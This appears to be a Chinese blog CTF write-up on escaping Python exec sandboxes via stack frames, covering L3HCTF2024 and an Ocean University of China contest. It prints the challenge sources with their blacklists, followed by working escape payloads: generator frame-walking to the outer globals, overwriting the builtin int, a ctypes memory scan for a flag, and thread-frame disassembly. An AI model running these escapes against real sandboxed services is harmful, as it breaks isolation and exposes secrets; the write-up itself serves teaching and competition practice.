+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(__builtins__)</span><br><span class="line">[<span class="string">&#x27;ArithmeticError&#x27;</span>, <span class="string">&#x27;AssertionError&#x27;</span>, <span class="string">&#x27;AttributeError&#x27;</span>, <span class="string">&#x27;BaseException&#x27;</span>, <span class="string">&#x27;BlockingIOError&#x27;</span>, <span class="string">&#x27;BrokenPipeError&#x27;</span>, <span class="string">&#x27;BufferError&#x27;</span>, <span class="string">&#x27;BytesWarning&#x27;</span>, <span class="string">&#x27;ChildProcessError&#x27;</span>, <span class="string">&#x27;ConnectionAbortedError&#x27;</span>, <span class="string">&#x27;ConnectionError&#x27;</span>, <span class="string">&#x27;ConnectionRefusedError&#x27;</span>, <span class="string">&#x27;ConnectionResetError&#x27;</span>, <span class="string">&#x27;DeprecationWarning&#x27;</span>, <span class="string">&#x27;EOFError&#x27;</span>, <span class="string">&#x27;Ellipsis&#x27;</span>, <span class="string">&#x27;EnvironmentError&#x27;</span>, <span class="string">&#x27;Exception&#x27;</span>, <span class="string">&#x27;False&#x27;</span>, <span class="string">&#x27;FileExistsError&#x27;</span>, <span class="string">&#x27;FileNotFoundError&#x27;</span>, <span class="string">&#x27;FloatingPointError&#x27;</span>, <span class="string">&#x27;FutureWarning&#x27;</span>, <span class="string">&#x27;GeneratorExit&#x27;</span>, <span class="string">&#x27;IOError&#x27;</span>, <span class="string">&#x27;ImportError&#x27;</span>, <span class="string">&#x27;ImportWarning&#x27;</span>, <span class="string">&#x27;IndentationError&#x27;</span>, <span class="string">&#x27;IndexError&#x27;</span>, <span class="string">&#x27;InterruptedError&#x27;</span>, <span class="string">&#x27;IsADirectoryError&#x27;</span>, <span class="string">&#x27;KeyError&#x27;</span>, <span class="string">&#x27;KeyboardInterrupt&#x27;</span>, <span class="string">&#x27;LookupError&#x27;</span>, <span class="string">&#x27;MemoryError&#x27;</span>, <span class="string">&#x27;ModuleNotFoundError&#x27;</span>, <span class="string">&#x27;NameError&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;NotADirectoryError&#x27;</span>, <span class="string">&#x27;NotImplemented&#x27;</span>, <span class="string">&#x27;NotImplementedError&#x27;</span>, <span class="string">&#x27;OSError&#x27;</span>, <span class="string">&#x27;OverflowError&#x27;</span>, <span class="string">&#x27;PendingDeprecationWarning&#x27;</span>, <span class="string">&#x27;PermissionError&#x27;</span>, <span class="string">&#x27;ProcessLookupError&#x27;</span>, <span class="string">&#x27;RecursionError&#x27;</span>, <span class="string">&#x27;ReferenceError&#x27;</span>, <span class="string">&#x27;ResourceWarning&#x27;</span>, <span class="string">&#x27;RuntimeError&#x27;</span>, <span class="string">&#x27;RuntimeWarning&#x27;</span>, <span class="string">&#x27;StopAsyncIteration&#x27;</span>, <span class="string">&#x27;StopIteration&#x27;</span>, <span class="string">&#x27;SyntaxError&#x27;</span>, <span class="string">&#x27;SyntaxWarning&#x27;</span>, <span class="string">&#x27;SystemError&#x27;</span>, <span class="string">&#x27;SystemExit&#x27;</span>, <span class="string">&#x27;TabError&#x27;</span>, <span class="string">&#x27;TimeoutError&#x27;</span>, <span class="string">&#x27;True&#x27;</span>, <span class="string">&#x27;TypeError&#x27;</span>, <span class="string">&#x27;UnboundLocalError&#x27;</span>, <span class="string">&#x27;UnicodeDecodeError&#x27;</span>, <span class="string">&#x27;UnicodeEncodeError&#x27;</span>, <span class="string">&#x27;UnicodeError&#x27;</span>, <span class="string">&#x27;UnicodeTranslateError&#x27;</span>, <span class="string">&#x27;UnicodeWarning&#x27;</span>, <span class="string">&#x27;UserWarning&#x27;</span>, <span class="string">&#x27;ValueError&#x27;</span>, <span class="string">&#x27;Warning&#x27;</span>, <span class="string">&#x27;WindowsError&#x27;</span>, <span class="string">&#x27;ZeroDivisionError&#x27;</span>, <span class="string">&#x27;__build_class__&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;all&#x27;</span>, <span class="string">&#x27;any&#x27;</span>, <span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;bool&#x27;</span>, <span class="string">&#x27;breakpoint&#x27;</span>, <span class="string">&#x27;bytearray&#x27;</span>, <span class="string">&#x27;bytes&#x27;</span>, <span class="string">&#x27;callable&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;classmethod&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;complex&#x27;</span>, <span class="string">&#x27;copyright&#x27;</span>, <span class="string">&#x27;credits&#x27;</span>, <span class="string">&#x27;delattr&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;divmod&#x27;</span>, <span class="string">&#x27;enumerate&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;float&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;frozenset&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;hasattr&#x27;</span>, <span class="string">&#x27;hash&#x27;</span>, <span class="string">&#x27;help&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;isinstance&#x27;</span>, <span class="string">&#x27;issubclass&#x27;</span>, <span class="string">&#x27;iter&#x27;</span>, <span class="string">&#x27;len&#x27;</span>, <span class="string">&#x27;license&#x27;</span>, <span class="string">&#x27;list&#x27;</span>, <span class="string">&#x27;locals&#x27;</span>, <span class="string">&#x27;map&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;oct&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;property&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;range&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;reversed&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;setattr&#x27;</span>, <span class="string">&#x27;slice&#x27;</span>, <span class="string">&#x27;sorted&#x27;</span>, <span class="string">&#x27;staticmethod&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;sum&#x27;</span>, <span class="string">&#x27;super&#x27;</span>, <span class="string">&#x27;tuple&#x27;</span>, <span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;vars&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="L3HCTF2024"><a href="#L3HCTF2024" class="headerlink" title="L3HCTF2024"></a>L3HCTF2024</h2><p>源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;&lt;codehere&gt;&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    codes.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;__&quot;</span> <span class="keyword">in</span> codes:</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">codes+=<span class="string">&quot;\nres=factorization(c)&quot;</span></span><br><span class="line"><span class="built_in">locals</span>=&#123;<span class="string">&quot;c&quot;</span>:<span class="string">&quot;696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863&quot;</span>,<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">res=<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blackFunc</span>(<span class="params">oldexit</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">event, args</span>):</span><br><span class="line">        blackList = [<span class="string">&quot;process&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;sys&quot;</span>,<span class="string">&quot;interpreter&quot;</span>,<span class="string">&quot;cpython&quot;</span>,<span class="string">&quot;open&quot;</span>,<span class="string">&quot;compile&quot;</span>,<span class="string">&quot;__new__&quot;</span>,<span class="string">&quot;gc&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> blackList:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> (event + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> args)).lower():</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                oldexit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> func</span><br><span class="line"></span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;&lt;judgecode&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">sys.addaudithook(blackFunc(os._exit))</span><br><span class="line"><span class="built_in">exec</span>(code,&#123;<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>&#125;,<span class="built_in">locals</span>)</span><br><span class="line"></span><br><span class="line">p=<span class="built_in">int</span>(<span class="built_in">locals</span>[<span class="string">&quot;res&quot;</span>][<span class="number">0</span>])</span><br><span class="line">q=<span class="built_in">int</span>(<span class="built_in">locals</span>[<span class="string">&quot;res&quot;</span>][<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span>(p&gt;<span class="number">1e5</span> <span class="keyword">and</span> q&gt;<span class="number">1e5</span> <span class="keyword">and</span> p*q==<span class="built_in">int</span>(<span class="string">&quot;696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863&quot;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Correct!&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Wrong!&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>上述代码大概就是通过exec执行任意代码，返回的p和q需要满足if语句</p>
+<p>过滤了<code>__</code>，还有过滤一些其他，这导致不能使用gc去获取对象引用（下面的据说可以用gc秒）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if &quot;__&quot; in codes:</span><br><span class="line">    exit(0)</span><br><span class="line">    </span><br><span class="line">blackList = [&quot;process&quot;,&quot;os&quot;,&quot;sys&quot;,&quot;interpreter&quot;,&quot;cpython&quot;,&quot;open&quot;,&quot;compile&quot;,&quot;__new__&quot;,&quot;gc&quot;]</span><br></pre></td></tr></table></figure>
+
+<p>最关键的是 <code>&#123;&quot;__builtins__&quot;: None&#125;</code> 置空了<code>__builtins__</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(code,&#123;&quot;__builtins__&quot;: None&#125;,locals)</span><br></pre></td></tr></table></figure>
+
+<p>根据上述条件，这道题的解题思路就是通过栈帧对象逃逸出沙箱从而获取到沙箱外的globals</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=(a.gi_frame.f_back.f_back for i in [1])</span><br><span class="line">a=[x for x in a][0]</span><br><span class="line">globals=a.f_back.f_back.f_globals</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a=(a.gi_frame.f_back.f_back for i in [1])</span><br><span class="line">a=[x for x in a][0]STYLUS</span><br><span class="line">a=(a.gi_frame.f_back.f_back for i in [1])</span><br><span class="line">a=[x for x in a][0]</span><br><span class="line">globals=a.f_back.f_back.f_globals   </span><br><span class="line">#自行控制f_back，逃逸到外部文件即可，如果是flask，不要逃逸过头了到源文件去了STYLUS</span><br></pre></td></tr></table></figure>
+
+<p>然后将沙箱外部的int函数修改为fakeint函数即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def fake_int(i):</span><br><span class="line">    return 100001 * 100002</span><br><span class="line">a=(a.gi_frame.f_back.f_back for i in [1])</span><br><span class="line">a=[x for x in a][0]</span><br><span class="line">builtin =a.f_back.f_back.f_globals[&quot;_&quot;*2+&quot;builtins&quot;+&quot;_&quot;*2]</span><br><span class="line">builtin.int=fake_int</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="第九届中国海洋大学信息安全竞赛"><a href="#第九届中国海洋大学信息安全竞赛" class="headerlink" title="第九届中国海洋大学信息安全竞赛"></a>第九届中国海洋大学信息安全竞赛</h2><p>源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">black_list = [</span><br><span class="line">    <span class="string">&#x27;__build_class__&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;SystemExit&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;breakpoint&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;input&#x27;</span></span><br><span class="line">]</span><br><span class="line">new_builtins = <span class="built_in">dict</span>([</span><br><span class="line">    (key, val) <span class="keyword">for</span> key, val <span class="keyword">in</span> __builtins__.__dict__.items() <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> black_list</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;xxxxxxxxx&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;DISPOSED&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/static/index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    out = io.StringIO()</span><br><span class="line">    script = <span class="built_in">str</span>(request.form[<span class="string">&quot;script&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrap_print</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        kwargs[<span class="string">&quot;file&quot;</span>] = out</span><br><span class="line">        <span class="built_in">print</span>(*args, **kwargs)</span><br><span class="line">    new_builtins[<span class="string">&quot;print&quot;</span>] = wrap_print</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span>(script, &#123;<span class="string">&quot;__builtins__&quot;</span>: new_builtins&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        wrap_print(e)</span><br><span class="line">    </span><br><span class="line">    ret = out.getvalue()</span><br><span class="line">    out.close()</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">5</span>) <span class="comment"># current source file is deleted</span></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">9001</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>flag在源码中，但是源码被删除，没有 <code>/proc</code>目录</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://img2023.cnblogs.com/blog/3239321/202405/3239321-20240504175805686-2047619731.png" alt="image-20240504175805250"></p>
+<p>要获得被覆写的 flag 内容只剩一个地方可以找，就是依靠 python 解析自身进程的内存</p>
+<p>cpython 的实现中暴露了获取 python 栈帧的方法</p>
+<p>而每个栈帧都会保存当时的 py 字节码和记录自身上一层的栈帧</p>
+<p>而对 flag 的赋值的字节码肯定存在于某个栈帧中，我们只需要从当前栈帧向上找就行了</p>
+<h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>利用 <code>ctypes</code>模块的指针，将<code>flag</code>地址周围的值读一下，实现一个从内存读源码</p>
+<p>因为真正的flag在覆盖的flag之前，所以读到假的flag的地址后，往前读取即可</p>
+<p>这里用了char 指针，读出来的是一个字符串</p>
+<p>最细节的是每次位移8的倍数。（可以自行对比任意两个变量的地址，可以发现它们的差值都是8的倍数）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a=(a.gi_frame.f_back.f_back for i in [1])</span><br><span class="line">a = [x for x in a][0]</span><br><span class="line"></span><br><span class="line">b = a.f_back.f_globals</span><br><span class="line">flag_id = id(b[&#x27;flag&#x27;])    #id()函数用于读取内存地址</span><br><span class="line">ctypes = b[&quot;__builtins__&quot;].__import__(&#x27;ctypes&#x27;)</span><br><span class="line">#print(ctypes)</span><br><span class="line"></span><br><span class="line">for i in range(10000):</span><br><span class="line">	txt = ctypes.cast((flag_id-8*i),ctypes.c_char_p).value</span><br><span class="line">	if b&quot;flag&quot; in txt:</span><br><span class="line">		print(txt)STYLUS</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://img2023.cnblogs.com/blog/3239321/202405/3239321-20240512160435697-202762695.png" alt="image-20240429203332334"></p>
+<h3 id="官方wp"><a href="#官方wp" class="headerlink" title="官方wp"></a>官方wp</h3><p>使用的是非常普通的继承链获取globals对象，然后从线程上去找栈帧</p>
+<p>而且flask 使用了多线程去处理每个请求，这导致直接在当前线程的栈帧向上找会找不到主线程的 flag，需要从主线程栈帧向上找</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sys = print.__globals__[&quot;__builtins__&quot;].__import__(&#x27;sys&#x27;)</span><br><span class="line">io = print.__globals__[&quot;__builtins__&quot;].__import__(&#x27;io&#x27;)</span><br><span class="line">dis = print.__globals__[&quot;__builtins__&quot;].__import__(&#x27;dis&#x27;)</span><br><span class="line">threading = print.__globals__[&quot;__builtins__&quot;].__import__(&#x27;threading&#x27;)</span><br><span class="line">print(threading.enumerate())     #获取所有活跃线程</span><br><span class="line">print(threading.main_thread())    #获取主线程</span><br><span class="line">print(threading.main_thread().ident)   # 获取主线程标识符</span><br><span class="line">print(sys._current_frames())      # 获取所有线程的堆栈帧对象</span><br><span class="line">print(sys._current_frames()[threading.main_thread().ident]) #获取到主线程的堆栈帧对象</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">frame = sys._current_frames()[threading.main_thread().ident]</span><br><span class="line"></span><br><span class="line">while frame is not None:</span><br><span class="line">	out = io.StringIO()     # 内存创建字符串I/O流</span><br><span class="line">	dis.dis(frame.f_code,file=out)   # 将当前堆栈帧所对应的函数的字节码进行反汇编</span><br><span class="line">	content = out.getvalue()    #获取反汇编的结果</span><br><span class="line">	out.close()</span><br><span class="line">	print(content)</span><br><span class="line">	frame = frame.f_back</span><br><span class="line">PYTHON</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://img2023.cnblogs.com/blog/3239321/202405/3239321-20240512160535185-674885589.png" alt="image-20240429222137005"></p>
+<h3 id="gc"><a href="#gc" class="headerlink" title="gc"></a>gc</h3><p>L3HCTF那题禁用了gc，但是这题没有，有师傅用这个秒了好像</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print([].__class__.__base__.__subclasses__()[84].load_module(&#x27;gc&#x27;).get_objects())</span><br><span class="line"></span><br><span class="line">#&lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;STYLUS</span><br></pre></td></tr></table></figure>
+
+<p>东西太多了，有点卡</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://img2023.cnblogs.com/blog/3239321/202405/3239321-20240512160522065-916837349.png" alt="image-20240430001910400"></p>
+<p>题外话：</p>
+<p>这回国赛遇到了我竟然没做？？？！！！，没做？？？（我真该死）</p>
+<p>参考：</p>
+<p> <a target="_blank" rel="noopener" href="https://zer0peach.github.io/2024/04/29/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#python%E5%88%A9%E7%94%A8%E6%A0%88%E5%B8%A7%E8%BF%9B%E8%A1%8C%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8">python利用栈帧进行沙箱逃逸</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi=DteDsD7md0=dqIDoD97iGoD&alichlgref=https://www.google.com/#toc-0">Python利用栈帧沙箱逃逸</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017318207388128">生成器</a></p>
+<p><a target="_blank" rel="noopener" href="https://jbnrz.com.cn/index.php/2024/02/16/l3hctf-2024/">L3HCTF-intractable problem</a></p>
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/06/07/Opcache-PHP/">PHP7/8 OPCACHE缓存文件导致的RCE</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><center>
